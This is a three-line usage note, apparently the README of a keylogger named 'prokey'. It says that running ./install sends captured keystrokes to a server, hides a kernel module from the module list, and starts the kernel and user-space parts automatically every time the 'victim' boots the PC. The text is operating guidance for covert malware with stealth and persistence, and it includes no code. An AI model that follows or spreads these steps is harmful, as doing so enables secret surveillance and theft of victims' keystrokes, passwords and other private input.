you need to type ./install in prokey folder and it will be start sending the key to the server 
the kernel is hide from the kernel list
and when ever the victim start the pc it automatically run the kernel and the user space